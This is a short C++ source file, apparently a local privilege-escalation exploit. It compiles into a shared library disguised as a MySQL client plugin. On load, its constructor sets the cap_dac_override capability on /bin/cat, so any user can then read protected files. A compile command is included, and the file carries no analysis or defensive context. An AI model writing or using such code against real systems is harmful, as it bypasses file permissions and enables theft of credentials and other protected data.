#include <stdlib.h>
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
#include <sys/capability.h>


void lshell(){
    cap_t caps = cap_from_text("cap_dac_override=eip");
    cap_set_file("/bin/cat", caps);
    printf("setcap finished\n");
}

class LOLITA {
public:
    LOLITA(){
        lshell();
    }
};
LOLITA _mysql_client_plugin_declaration_;
//compile: g++ expcap.cpp -shared -fPIC -o cap.so -lcap2